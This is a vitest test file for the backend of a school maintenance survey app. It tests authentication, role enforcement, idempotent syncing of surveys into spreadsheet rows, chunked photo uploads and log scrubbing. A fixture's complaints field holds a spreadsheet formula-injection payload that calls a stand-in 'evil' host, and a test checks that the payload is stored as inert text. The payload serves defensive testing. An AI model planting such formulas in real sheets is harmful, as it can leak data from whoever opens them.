import { beforeEach, describe, expect, test } from 'vitest';
import {
  API_VERSION,
  RESPONSES_HEADER,
  RESPONSES_TAB,
  RUBRIC_VERSION,
  TRANSIENT_ERRORS,
  UPLOAD_CHUNK_BYTES,
  base64Encode,
  bytesToHex,
  rubricGroupsForLocation,
  scoreSurveyFor,
  sha256,
  uuidv7,
} from '@mqi/shared';
import type { ApiResponse, AttachmentMeta, School, SiblingExternalResult, SurveyLocation, PushResult, SubmittedSurvey, UploadResult, WhoAmI } from '@mqi/shared';
import { createMemoryEnv } from '../adapters/memory';
import type { MemoryEnv } from '../adapters/memory';
import { DEV_PASSWORD, seedDevEnv } from '../dev/server';
import { getSharded, putSharded } from './reads';
import { handleRequest, scrub } from './router';

let env: MemoryEnv;
let seq = 0;
const ids = () => uuidv7(env.crypto.randomBytes, env.clock.now + seq++);

function call<T = unknown>(action: string, payload: unknown = {}, session?: string, apiVersion = API_VERSION): ApiResponse<T> {
  return handleRequest(env, JSON.stringify({ action, apiVersion, auth: session ? { session } : undefined, payload })) as ApiResponse<T>;
}
function ok<T>(r: ApiResponse<T>): T {
  if (!r.ok) throw new Error(`${r.error.code}: ${r.error.message}`);
  return r.data;
}
function code(r: ApiResponse<unknown>): string {
  return r.ok ? 'ok' : r.error.code;
}
function login(email: string, password = DEV_PASSWORD): string {
  return ok(call<WhoAmI>('auth.login', { email, password })).sessionToken;
}

type Loc = SubmittedSurvey['locations'][number];
function location(name: string, type: SurveyLocation['type'], scores: SurveyLocation['scores'], photos: Loc['photos'] = {}, notes: Record<string, string> = {}): Loc {
  return { id: name, floorLevel: type === 'Roof' ? 'Roof' : 'Ground', type, name, scores, photos, notes };
}

/** A complete, valid survey with one photo, scored exactly as the phone would. */
function makeSurvey(overrides: Partial<SubmittedSurvey> = {}): { survey: SubmittedSurvey; attachments: AttachmentMeta[] } {
  const id = ids();
  const photoId = ids();
  const locations = overrides.locations ?? [
    location(
      'Roof 1',
      'Roof',
      {
        'Access to roof area /tanks': 'Good',
        'Roof Screeding/roof drainage': 'Very Poor',
        'Water Storage (Overhead Tank)': 'Ok',
        'External Plumbing': 'Good',
        'Grill Gate': 'N/A',
        'Solar Panels/Inverter/Batteries': 'Good',
        Plaster: 'Poor',
        Masonry: 'Good',
      },
      { 'Roof Screeding/roof drainage': [photoId] },
      { Plaster: 'Cracked near the tank' },
    ),
  ];
  const r = scoreSurveyFor(locations, RUBRIC_VERSION);
  const survey: SubmittedSurvey = {
    id,
    rubricVersion: RUBRIC_VERSION,
    school: { schoolId: '947', name: 'OGS Trust Campus', region: 'South West', area: 'Gadap West I' },
    asm: 'ASM',
    apm: 'APM',
    principal: 'Principal',
    powerSupply: 'Solar',
    structuralConcern: 'NO',
    buildingStructure: 'RCC',
    typeOfStructure: 'RCC (Frame)',
    centerBeam: 'YES',
    drillingCheck: { done: 'NO', pointMarked: '', slabAssessment: '', slabThicknessMm: '', screedThicknessMm: '', holeRepaired: '' },
    siteChecks: { roofAccessType: 'Ladder', overflowDisposal: 'Provided', roofClean: 'Yes', rainSpoutsClear: 'Yes', riskFactors: [], riskFactorOther: '' },
    complaints: '=IMPORTXML("http://evil","//a")',
    declaration: true,
    locations,
    reviewPhotos: {},
    startTime: '2026-10-28T04:00:00.000Z',
    endTime: '2026-10-28T05:00:00.000Z',
    timeTakenSeconds: 3500,
    pausedSeconds: 100,
    scores: {
      overall: r.overall,
      functionality: r.categories.Functionality.score,
      safety: r.categories.Safety.score,
      aesthetics: r.categories.Aesthetics.score,
      major: r.major,
      minor: r.minor,
      criticalItems: r.criticalItems,
    },
    createdAt: '2026-10-28T04:00:00.000Z',
    updatedAt: '2026-10-28T05:00:00.000Z',
    ...overrides,
  };
  const attachments: AttachmentMeta[] = Object.values(locations)
    .flatMap((l) => Object.entries(l.photos).flatMap(([item, pids]) => pids.map((pid) => ({ pid, item, l }))))
    .map(({ pid, item, l }) => ({ id: pid, surveyId: id, itemName: item, locationName: l.name, location: { floorLevel: l.floorLevel, type: l.type, name: l.name }, mimeType: 'image/jpeg' as const, size: 1000 }));
  return { survey, attachments };
}

function push(session: string, ...items: { survey: SubmittedSurvey; attachments: AttachmentMeta[] }[]) {
  return call<{ results: PushResult[] }>('sync.push', { items: items.map((it, i) => ({ outboxId: i + 1, ...it })) }, session);
}

const rowsFor = (surveyId: string) => env.responses.objects(RESPONSES_TAB).filter((r) => r['Survey ID'] === surveyId);
const attachmentRows = (surveyId: string) => env.responses.objects('MQI Survey Attachments').filter((r) => r['Survey ID'] === surveyId);

beforeEach(() => {
  env = createMemoryEnv();
  seedDevEnv(env);
  seq = 0;
});

describe('envelope', () => {
  test('every answer carries ok, serverTime, rubricVersion and a requestId', () => {
    const r = call('schools.list');
    expect(r.ok).toBe(false);
    expect(r.serverTime).toBeTruthy();
    expect(r.rubricVersion).toBe(RUBRIC_VERSION);
    expect(r.requestId).toMatch(/^[0-9a-f]{16}$/);
  });

  test('an old client gets UPGRADE_REQUIRED before anything else', () => {
    expect(code(call('auth.login', { email: 'a@b.c', password: 'x' }, undefined, 0))).toBe('UPGRADE_REQUIRED');
  });

  test('bad JSON and unknown actions are refused cleanly', () => {
    expect(code(handleRequest(env, '{nope'))).toBe('VALIDATION');
    expect(code(call('nope.nope', {}, login('surveyor@tcf.test')))).toBe('NOT_FOUND');
  });
});

describe('auth', () => {
  test('sign-up is pending until approved (FR-AUTH-1/2/3)', () => {
    expect(ok(call('auth.signup', { name: 'New Person', email: 'New@TCF.org.pk', password: 'a-long-secret' }))).toEqual({ status: 'PENDING' });
    expect(code(call('auth.signup', { name: 'Again', email: 'new@tcf.org.pk', password: 'another-secret' }))).toBe('CONFLICT');
    const pending = call('auth.login', { email: 'new@tcf.org.pk', password: 'a-long-secret' });
    expect(code(pending)).toBe('ACCESS_REVOKED');
    expect(!pending.ok && pending.error.message).toMatch(/awaiting approval/);

    const admin = login('admin@tcf.test');
    const users = ok(call<{ users: { id: string; email: string }[] }>('admin.users.list', {}, admin)).users;
    const id = users.find((u) => u.email === 'new@tcf.org.pk')!.id;
    ok(call('admin.users.approve', { userId: id, role: 'SURVEYOR' }, admin));
    expect(code(call('auth.login', { email: 'new@tcf.org.pk', password: 'a-long-secret' }))).toBe('ok');
  });

  test('wrong password and unknown email give the same message', () => {
    const a = call('auth.login', { email: 'surveyor@tcf.test', password: 'wrong-password' });
    const b = call('auth.login', { email: 'nobody@tcf.test', password: 'wrong-password' });
    expect(!a.ok && !b.ok && a.error.message === b.error.message).toBe(true);
  });

  test('5 failures lock the account for 15 minutes, even with the right password', () => {
    for (let i = 0; i < 5; i++) expect(code(call('auth.login', { email: 'surveyor@tcf.test', password: 'wrong-password' }))).toBe('UNAUTHENTICATED');
    expect(code(call('auth.login', { email: 'surveyor@tcf.test', password: DEV_PASSWORD }))).toBe('RATE_LIMITED');
    env.clock.now += 16 * 60_000;
    expect(code(call('auth.login', { email: 'surveyor@tcf.test', password: DEV_PASSWORD }))).toBe('ok');
  });

  test('global throttle across all accounts', () => {
    for (let i = 0; i < 60; i++) call('auth.login', { email: `x${i}@tcf.test`, password: 'whatever-1' });
    expect(code(call('auth.login', { email: 'surveyor@tcf.test', password: DEV_PASSWORD }))).toBe('RATE_LIMITED');
  });

  test('tampered and expired tokens are refused', () => {
    const t = login('surveyor@tcf.test');
    expect(code(call('auth.whoami', {}, t.slice(0, -2) + 'xx'))).toBe('UNAUTHENTICATED');
    expect(code(call('auth.whoami', {}, t))).toBe('ok');
    env.clock.now += 61 * 86_400_000;
    expect(code(call('auth.whoami', {}, t))).toBe('UNAUTHENTICATED');
  });

  test('whoami re-issues a fresh 60-day token', () => {
    const t = login('surveyor@tcf.test');
    env.clock.now += 50 * 86_400_000;
    const fresh = ok(call<WhoAmI>('auth.whoami', {}, t)).sessionToken;
    env.clock.now += 20 * 86_400_000;
    expect(code(call('auth.whoami', {}, fresh))).toBe('ok');
  });

  test('revocation takes effect immediately; logoutAll kills earlier tokens', () => {
    const admin = login('admin@tcf.test');
    const t = login('surveyor@tcf.test');
    const id = ok(call<{ users: { id: string; email: string }[] }>('admin.users.list', {}, admin)).users.find((u) => u.email === 'surveyor@tcf.test')!.id;
    ok(call('admin.users.revoke', { userId: id }, admin));
    expect(code(call('sync.pull', {}, t))).toBe('ACCESS_REVOKED');

    const r = login('reviewer@tcf.test');
    ok(call('auth.logoutAll', {}, r));
    expect(code(call('sync.pull', {}, r))).toBe('UNAUTHENTICATED');
  });

  test('a temporary password forces a change, then works', () => {
    const admin = login('admin@tcf.test');
    const id = ok(call<{ users: { id: string; email: string }[] }>('admin.users.list', {}, admin)).users.find((u) => u.email === 'surveyor@tcf.test')!.id;
    const old = login('surveyor@tcf.test');
    const { temporaryPassword } = ok(call<{ temporaryPassword: string }>('admin.issuePassword', { userId: id }, admin));
    expect(code(call('sync.pull', {}, old))).toBe('UNAUTHENTICATED');
    const t = ok(call<WhoAmI>('auth.login', { email: 'surveyor@tcf.test', password: temporaryPassword }));
    expect(t.mustChangePassword).toBe(true);
    expect(code(call('sync.pull', {}, t.sessionToken))).toBe('PASSWORD_CHANGE_REQUIRED');
    const changed = ok(call<WhoAmI>('auth.changePassword', { currentPassword: temporaryPassword, newPassword: 'brand-new-pass' }, t.sessionToken));
    expect(changed.mustChangePassword).toBe(false);
    expect(code(call('sync.pull', {}, changed.sessionToken))).toBe('ok');
  });

  test('password hashes never leave the server', () => {
    const admin = login('admin@tcf.test');
    const all = JSON.stringify([call('admin.users.list', {}, admin), call('auth.whoami', {}, admin)]);
    expect(all).not.toMatch(/"(hash|salt|iterations|tokenVersion)"/);
  });
});

describe('scope of every action', () => {
  test('role matrix is enforced on the server', () => {
    const s = login('surveyor@tcf.test');
    const r = login('reviewer@tcf.test');
    expect(code(call('admin.users.list', {}, s))).toBe('FORBIDDEN');
    expect(code(call('admin.issuePassword', { userId: 'x' }, r))).toBe('FORBIDDEN');
    expect(code(push(r, makeSurvey()))).toBe('FORBIDDEN');
    expect(code(call('dashboard.get', {}, r))).toBe('ok');
    expect(code(call('export.rows', { offset: 0, limit: 10 }, r))).toBe('ok');
  });

  test('everything except sign-up, login and client.log needs a session', () => {
    for (const a of ['auth.whoami', 'sync.push', 'sync.pull', 'files.upload', 'files.get', 'dashboard.get', 'schools.list', 'surveys.get', 'export.rows', 'admin.users.list']) {
      expect(code(call(a, {}))).toBe('UNAUTHENTICATED');
    }
    expect(code(call('client.log', { level: 'error', message: 'x' }))).toBe('ok');
  });
});

describe('sync.push', () => {
  test('writes one row per location, header-mapped, RAW-typed, submitter from the session', () => {
    const t = login('surveyor@tcf.test');
    const item = makeSurvey();
    const res = ok(push(t, item));
    expect(res.results[0]).toMatchObject({ status: 'ok' });
    const [row] = rowsFor(item.survey.id);
    expect(row).toBeDefined();
    expect(row!['Overall Score']).toBe(Math.round(item.survey.scores.overall!));
    expect(typeof row!['Overall Score']).toBe('number');
    expect(row!['Major Complaints']).toBe('=IMPORTXML("http://evil","//a")'); // text, never a formula
    expect(row!['Submitted By']).toBe('Dev Surveyor');
    expect(row!['Submitter Email']).toBe('surveyor@tcf.test');
    expect(row!['Source App']).toBe('v2');
    expect(row!['Roof Screeding/roof drainage']).toBe('Very Poor');
    expect(attachmentRows(item.survey.id)).toEqual([expect.objectContaining({ 'Item Name': 'Plaster', Note: 'Cracked near the tank', 'Photo URL': '' })]);
  });

  test('follows a reordered live header and only appends new columns at the end', () => {
    const tab = env.responses.tabs.get(RESPONSES_TAB)!;
    const before = tab[0]!.map(String);
    // Someone moved columns around in the sheet.
    const reordered = [before[3]!, before[0]!, ...before.filter((_, i) => i !== 0 && i !== 3)];
    env.responses.tabs.set(RESPONSES_TAB, [reordered]);
    const t = login('surveyor@tcf.test');
    const item = makeSurvey();
    ok(push(t, item));
    const header = env.responses.header(RESPONSES_TAB)!;
    expect(header.slice(0, reordered.length)).toEqual(reordered);
    expect(new Set(header)).toEqual(new Set([...RESPONSES_HEADER]));
    const [row] = rowsFor(item.survey.id);
    expect(row!['School ID']).toBe('947');
  });

  test('an identical retry writes nothing (idempotent on survey ID)', () => {
    const t = login('surveyor@tcf.test');
    const item = makeSurvey();
    ok(push(t, item));
    const calls = env.responses.appendCalls;
    const again = ok(push(t, item));
    expect(again.results[0]).toMatchObject({ status: 'ok', duplicate: true });
    expect(env.responses.appendCalls).toBe(calls);
    expect(rowsFor(item.survey.id)).toHaveLength(1);
  });

  test('a response lost after the write never duplicates rows', () => {
    const t = login('surveyor@tcf.test');
    const item = makeSurvey();
    env.responses.failAfterNextAppend = true;
    expect(code(push(t, item))).toBe('INTERNAL'); // phone sees a failure and will retry
    expect(rowsFor(item.survey.id)).toHaveLength(1); // ...but the rows did land
    const retry = ok(push(t, item));
    expect(retry.results[0]!.status).toBe('ok');
    expect(rowsFor(item.survey.id)).toHaveLength(1);
    expect(attachmentRows(item.survey.id)).toHaveLength(1);
  });

  test('rows v1 appends between v2 pushes are kept', () => {
    const t = login('surveyor@tcf.test');
    const a = makeSurvey();
    ok(push(t, a));
    env.responses.appendRaw(RESPONSES_TAB, [['v1-survey', '2026-10-28T05:00:00.000Z']]);
    const b = makeSurvey();
    ok(push(t, b));
    const ids = env.responses.objects(RESPONSES_TAB).map((r) => r['Survey ID']);
    expect(ids).toEqual([a.survey.id, 'v1-survey', b.survey.id]);
  });

  test('a rejected survey does not block the next one', () => {
    const t = login('surveyor@tcf.test');
    const bad = makeSurvey({ apm: '' });
    const good = makeSurvey();
    const res = ok(push(t, bad, good));
    expect(res.results.map((r) => r.status)).toEqual(['rejected', 'ok']);
    expect(res.results[0]!.error?.code).toBe('VALIDATION');
    expect(rowsFor(good.survey.id)).toHaveLength(1);
  });

  test('scores that disagree with the server are rejected', () => {
    const t = login('surveyor@tcf.test');
    const item = makeSurvey();
    item.survey.scores.overall = 99;
    expect(ok(push(t, item)).results[0]).toMatchObject({ status: 'rejected', error: { code: 'VALIDATION' } });
  });

  test('a busy lock is LOCK_TIMEOUT (retried by the phone)', () => {
    const t = login('surveyor@tcf.test');
    env.lock.busy = true;
    expect(code(push(t, makeSurvey()))).toBe('LOCK_TIMEOUT');
  });

  test("another user's survey ID is a conflict", () => {
    const item = makeSurvey();
    ok(push(login('surveyor@tcf.test'), item));
    expect(ok(push(login('admin@tcf.test'), item)).results[0]!.error?.code).toBe('CONFLICT');
  });
});

describe('files.upload (chunked, idempotent)', () => {
  function upload(t: string, attachmentId: string, bytes: Uint8Array, chunkIndex: number) {
    const count = Math.max(1, Math.ceil(bytes.length / UPLOAD_CHUNK_BYTES));
    const part = bytes.slice(chunkIndex * UPLOAD_CHUNK_BYTES, (chunkIndex + 1) * UPLOAD_CHUNK_BYTES);
    return call<UploadResult>('files.upload', { attachmentId, chunkIndex, chunkCount: count, totalSize: bytes.length, data: base64Encode(part) }, t);
  }

  test('needs the parent survey first', () => {
    const t = login('surveyor@tcf.test');
    expect(code(upload(t, ids(), new Uint8Array(1000), 0))).toBe('NOT_FOUND');
  });

  test('one chunk: Drive file, attachment row with the link, idempotent on repeat', () => {
    const t = login('surveyor@tcf.test');
    const item = makeSurvey();
    ok(push(t, item));
    const a = item.attachments[0]!;
    const bytes = new Uint8Array(1000).map((_, i) => i % 251);
    const r = ok(upload(t, a.id, bytes, 0));
    expect(r.done).toBe(true);
    expect(r.url).toMatch(/drive\.google\.com\/file\/d\//);
    expect(ok(upload(t, a.id, bytes, 0)).done).toBe(true);
    expect(env.drive.createdFiles).toBe(1);
    const photoRows = attachmentRows(item.survey.id).filter((x) => x['Photo URL']);
    expect(photoRows).toEqual([{ 'Survey ID': item.survey.id, 'Item Name': 'Roof Screeding/roof drainage', 'Location Name': 'Roof 1', 'Photo URL': r.url, Note: '' }]);
    const [file] = [...env.drive.files.values()];
    expect([...env.drive.folders.keys()].pop()).toBe('South West/OGS Trust Campus/2026-10-28 MQI Survey - ' + item.survey.id.split('-')[0] + '/Roof - Roof - Roof 1');
    expect(file!.name).toBe('Roof Screeding-roof drainage.jpg');
    const got = ok(call<{ data: string }>('files.get', { attachmentId: a.id }, login('reviewer@tcf.test')));
    expect(got.data).toBe(base64Encode(bytes));
  });

  test('W14: a damaged chunk is refused as retryable and nothing reaches Drive; the good one then goes', () => {
    const t = login('surveyor@tcf.test');
    const item = makeSurvey();
    ok(push(t, item));
    const a = item.attachments[0]!;
    const bytes = new Uint8Array(1000).map((_, i) => i % 251);
    const sent = { attachmentId: a.id, chunkIndex: 0, chunkCount: 1, totalSize: bytes.length, data: base64Encode(bytes) };
    const wrongSum = bytesToHex(sha256(new Uint8Array([1, 2, 3])));
    const bad = call<UploadResult>('files.upload', { ...sent, sha256: wrongSum }, t);
    expect(code(bad)).toBe('INTERNAL');
    expect(TRANSIENT_ERRORS).toContain('INTERNAL');
    expect(env.drive.createdFiles).toBe(0);
    expect(ok(call<UploadResult>('files.upload', { ...sent, sha256: bytesToHex(sha256(bytes)) }, t)).done).toBe(true);
    expect(env.drive.createdFiles).toBe(1);
  });

  test('several chunks, in order; a repeat or gap is handled', () => {
    const t = login('surveyor@tcf.test');
    const size = UPLOAD_CHUNK_BYTES * 2 + 10;
    const item = makeSurvey();
    item.attachments[0]!.size = size;
    ok(push(t, item));
    const id = item.attachments[0]!.id;
    const bytes = new Uint8Array(size).map((_, i) => i % 7);
    expect(code(upload(t, id, bytes, 1))).toBe('CONFLICT');
    expect(ok(upload(t, id, bytes, 0)).received).toEqual([0]);
    expect(ok(upload(t, id, bytes, 0)).received).toEqual([0]);
    expect(ok(upload(t, id, bytes, 1)).received).toEqual([0, 1]);
    expect(ok(upload(t, id, bytes, 2)).done).toBe(true);
    expect(env.drive.createdFiles).toBe(1);
    expect([...env.drive.files.values()][0]!.bytes.length).toBe(size);
  });

  test("another surveyor cannot upload into someone else's photo", () => {
    const admin = login('admin@tcf.test');
    ok(call('auth.signup', { name: 'Second Surveyor', email: 's2@tcf.test', password: 'second-secret' }));
    const id = ok(call<{ users: { id: string; email: string }[] }>('admin.users.list', {}, admin)).users.find((u) => u.email === 's2@tcf.test')!.id;
    ok(call('admin.users.approve', { userId: id, role: 'SURVEYOR' }, admin));
    const item = makeSurvey();
    ok(push(login('surveyor@tcf.test'), item));
    expect(code(upload(login('s2@tcf.test', 'second-secret'), item.attachments[0]!.id, new Uint8Array(1000), 0))).toBe('FORBIDDEN');
  });
});

describe('reads', () => {
  test('pull lists only my surveys', () => {
    const s = login('surveyor@tcf.test');
    const item = makeSurvey();
    ok(push(s, item));
    expect(ok(call<{ surveys: { surveyId: string }[] }>('sync.pull', {}, s)).surveys.map((x) => x.surveyId)).toEqual([item.survey.id]);
    expect(ok(call<{ surveys: unknown[] }>('sync.pull', {}, login('admin@tcf.test'))).surveys).toEqual([]);
  });

  test('surveys.get rebuilds a written survey (any approved user)', () => {
    const item = makeSurvey();
    ok(push(login('surveyor@tcf.test'), item));
    const found = ok(call<{ overall: number; rubricVersion: string; locations: unknown[] }>('surveys.get', { surveyId: item.survey.id }, login('reviewer@tcf.test')));
    expect(found).toMatchObject({ overall: Math.round(item.survey.scores.overall!), rubricVersion: RUBRIC_VERSION });
    expect(found.locations).toHaveLength(1);
    expect(code(call('surveys.get', { surveyId: 'missing' }, login('reviewer@tcf.test')))).toBe('NOT_FOUND');
  });

  test('W30: External Development of a sibling campus (same e-compound) is offered to the next one', () => {
    const surveyor = login('surveyor@tcf.test');
    const sibling = (schoolId: string) => ok(call<SiblingExternalResult>('schools.siblingExternal', { schoolId }, surveyor)).found;
    expect(sibling('948')).toBeNull(); // nothing recorded yet
    const ext = rubricGroupsForLocation('External Development');
    const extScores = Object.fromEntries(ext.map((g, i) => [g.name, i === 0 ? 'Poor' : 'Good'])) as SurveyLocation['scores'];
    const roof = makeSurvey().survey.locations[0]!;
    ok(push(surveyor, makeSurvey({ locations: [roof, { ...location('External Development 1', 'External Development', extScores), floorLevel: 'External' }] })));
    const found = sibling('948')!;
    expect(found).toMatchObject({ campusName: 'OGS Trust Campus', schoolId: '947' });
    expect(found.scores).toEqual(extScores);
    expect(sibling('947')).toBeNull(); // a campus is not its own sibling
    expect(sibling('499')).toBeNull(); // no e-compound
    // Reviewers cannot start surveys, so they cannot ask either.
    expect(code(call('schools.siblingExternal', { schoolId: '948' }, login('reviewer@tcf.test')))).toBe('FORBIDDEN');
  });

  test('schools list skips inactive campuses; dashboard counts the new survey', () => {
    const r = login('reviewer@tcf.test');
    const schools = ok(call<{ schools: School[] }>('schools.list', {}, r)).schools;
    expect(schools).toHaveLength(5);
    // W10: campus details, and the e-compound name from the E-Compound Spreadsheet.
    expect(schools.find((s) => s.schoolId === '947')).toMatchObject({
      address: 'Gadap Town, Karachi',
      latitude: '25.0120',
      longitude: '67.1500',
      eCompoundNo: 'S/1/10',
      eCompoundName: 'Gadap Compound (S/1/10)',
    });
    // A sibling without its own E-Compound row gets the name through the shared eCompound No.
    expect(schools.find((s) => s.schoolId === '948')?.eCompoundName).toBe('Gadap Compound (S/1/10)');
    ok(push(login('surveyor@tcf.test'), makeSurvey()));
    env.cache.clear();
    const d = ok(call<{ totalSchools: number; captured: number; pending: number }>('dashboard.get', {}, r));
    expect(d).toMatchObject({ totalSchools: 5, captured: 1, pending: 4 });
  });

  test('export.rows pages through a tab', () => {
    const s = login('surveyor@tcf.test');
    for (let i = 0; i < 3; i++) ok(push(s, makeSurvey()));
    const r = login('reviewer@tcf.test');
    const p1 = ok(call<{ rows: unknown[]; hasMore: boolean; header: string[] }>('export.rows', { offset: 0, limit: 2 }, r));
    expect(p1.rows).toHaveLength(2);
    expect(p1.hasMore).toBe(true);
    const p2 = ok(call<{ rows: unknown[]; hasMore: boolean }>('export.rows', { offset: 2, limit: 2 }, r));
    expect(p2.rows).toHaveLength(1);
    expect(p2.hasMore).toBe(false);
  });
});

describe('observability and limits', () => {
  test('client.log is stored without tokens or emails', () => {
    const t = login('surveyor@tcf.test');
    ok(call('client.log', { level: 'error', message: `boom for surveyor@tcf.test with ${t}` }, t));
    const log = env.system.tables.get('ErrorLog')!.rows;
    const last = log[log.length - 1]!.join(' ');
    expect(last).not.toContain('surveyor@tcf.test');
    expect(last).not.toContain(t);
    expect(scrub('a@b.co')).toBe('[email]');
  });

  test('server errors are logged with the action and request ID', () => {
    const t = login('surveyor@tcf.test');
    env.responses.failAfterNextAppend = true;
    const r = push(t, makeSurvey());
    const log = env.system.tables.get('ErrorLog')!.rows;
    expect(log[log.length - 1]).toEqual(expect.arrayContaining(['server', r.requestId, 'sync.push', 'INTERNAL']));
  });

  test('cache values are sharded under 90 KB', () => {
    const big = 'x'.repeat(250_000);
    putSharded(env, 'k', big, 60);
    expect(getSharded(env, 'k')).toBe(big);
  });
});
